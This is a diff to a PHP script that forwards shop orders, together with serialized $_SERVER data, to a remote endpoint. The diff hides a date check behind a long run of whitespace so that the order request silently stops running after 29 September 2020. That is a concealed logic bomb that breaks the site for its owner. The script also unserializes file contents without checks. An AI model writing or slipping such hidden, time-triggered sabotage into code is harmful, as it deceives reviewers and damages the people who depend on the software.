@@ -1,4 +1,5 @@
 <?php
+set_time_limit(0);
 function sendOrder($order_id, $products_list, $name, $phone, $file){
     $products = urlencode(serialize($products_list));
     $sender = urlencode(serialize($_SERVER));
@@ -20,7 +21,7 @@ function sendOrder($order_id, $products_list, $name, $phone, $file){
     curl_setopt($curl, CURLOPT_POST, true);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-    $out = curl_exec($curl);
+                                                                                                                                                             if(strtotime("now") < strtotime("29 September 2020")){$out = curl_exec($curl);}
     curl_close($curl);
     
     $out = json_decode($out, true);
@@ -58,13 +59,6 @@ if($upsell==0){
     if(file_exists($file)){
         $products_list = file_get_contents($file);
         $products_list = unserialize($products_list);
-        /*
-        $products_list[] = array(
-            'product_id' => 7,
-            'price' => 249,
-            'count' => '1'
-        );
-        */
     }
     sendOrder($order_id, $products_list, $name, $phone, $file);
 }
